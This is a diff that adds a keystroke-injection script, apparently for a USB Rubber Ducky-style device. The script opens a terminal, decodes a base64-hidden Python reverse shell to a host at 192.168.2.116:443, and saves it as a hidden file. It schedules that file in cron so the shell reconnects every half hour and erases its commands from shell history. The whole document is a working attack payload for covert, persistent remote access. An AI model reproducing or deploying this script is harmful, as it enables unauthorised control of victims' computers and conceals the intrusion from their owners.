@@ -1,0 +1,13 @@
+DELAY 3000
+ALT F2
+DELAY 500
+STRING xterm
+DELAY 500
+ENTER
+DELAY 750 
+STRING echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4yLjExNiIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn | base64 --decode > $HOME/.setup.sh && chmod +x $HOME/.setup.sh && history -d $((HISTCMD-1))
+DELAY 750
+ENTER
+STRING echo "0,30 * * * * $HOME/.setup.sh" > /tmp/config.txt && crontab /tmp/config.txt && rm /tmp/config.txt && history -d $((HISTCMD-1)) && exit
+DELAY 500
+ENTER
